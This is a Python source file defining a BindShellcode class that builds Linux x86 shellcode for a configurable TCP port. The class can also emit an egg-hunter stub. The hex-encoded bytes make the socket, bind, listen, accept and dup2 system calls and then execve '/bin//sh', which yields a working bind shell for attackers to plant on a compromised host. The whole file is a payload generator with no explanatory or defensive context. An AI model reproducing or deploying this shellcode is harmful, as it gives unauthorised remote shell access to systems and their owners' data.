import socket, binascii, logging


class BindShellcode:
    def __init__(self, port, arch, os):
        self.port   = port;
        self.arch   = arch;
        self.os     = os;
        self.valid  = False;
        self.__shellcode = "";
        self.debug  = False;
        logging.basicConfig(level=logging.DEBUG)
        self.__egg  = "";
        self.__egg_hunter = "";


    def shellcode(self):
        return self.__shellcode

    def egg_hunter(self):
        return self.__egg_hunter

    def get_egg(self):
        return self.__egg

    def set_egg(self, the_egg):
        self.__egg = the_egg
                
    def check(self):
        self.valid = True;
        if self.port < 1024 or self.port > 65535:
            logging.debug("[!] invalid TCP port number: %d" % self.port);
            self.valid = False

    def __port_to_string(self):
        no_port = socket.htons(self.port);
        hex_no_port = hex(no_port)

        h1 = hex_no_port[2:4]
        h2 = hex_no_port[4:6]

        if h1 == "":
            h1 = "00"

        if len(h1) == 1:
            h1 = "0" + h1

        if h2 == "":
            h2 = "00"

        if len(h2) == 1:
            h2 = "0" + h2

        hex_port_number = "\\x%s\\x%s" % (h2, h1)
        return hex_port_number
        
    def generate(self):

        if self.get_egg():
            logging.debug("An egg it has been found... creating egg hunter shellcode");
            self.__egg_hunter = "\\x31\\xc9\\xf7\\xe1\\x66\\x81\\xca\\xff\\x0f\\x42\\x8d\\x5a\\x04\\x31\\xc0\\xb0\\x21\\xcd\\x80\\x3c\\xf2\\x74\\xed\\xb8"+self.get_egg()+"\\x89\\xd7\\xaf\\x75\\xe8\\xaf\\x75\\xe5\\xff\\xe7"
            self.__shellcode=self.get_egg()+self.get_egg()+"\\x31\\xc0\\x89\\xc3\\x89\\xc1\\x89\\xc2\\x66\\xb8\\x67\\x01\\xb3\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc3\\x31\\xc0\\x66\\xb8\\x69\\x01\\x31\\xc9\\x51\\x66\\x68" + self.__port_to_string() + "\\x66\\x6a\\x02\\x89\\xe1\\xb2\\x10\\xcd\\x80\\x31\\xc9\\x31\\xc0\\x66\\xb8\\x6b\\x01\\xcd\\x80\\x31\\xc0\\x66\\xb8\\x6c\\x01\\x51\\x89\\xce\\x89\\xe1\\x89\\xe2\\xcd\\x80\\x89\\xc3\\x31\\xc9\\xb1\\x02\\x31\\xc0\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\x31\\xd2\\xb0\\x0b\\xcd\\x80";
        else:
            self.__shellcode = "\\x31\\xc0\\x89\\xc3\\x89\\xc1\\x89\\xc2\\x66\\xb8\\x67\\x01\\xb3\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc3\\x31\\xc0\\x66\\xb8\\x69\\x01\\x31\\xc9\\x51\\x66\\x68" + self.__port_to_string() + "\\x66\\x6a\\x02\\x89\\xe1\\xb2\\x10\\xcd\\x80\\x31\\xc9\\x31\\xc0\\x66\\xb8\\x6b\\x01\\xcd\\x80\\x31\\xc0\\x66\\xb8\\x6c\\x01\\x51\\x89\\xce\\x89\\xe1\\x89\\xe2\\xcd\\x80\\x89\\xc3\\x31\\xc9\\xb1\\x02\\x31\\xc0\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\x31\\xd2\\xb0\\x0b\\xcd\\x80";



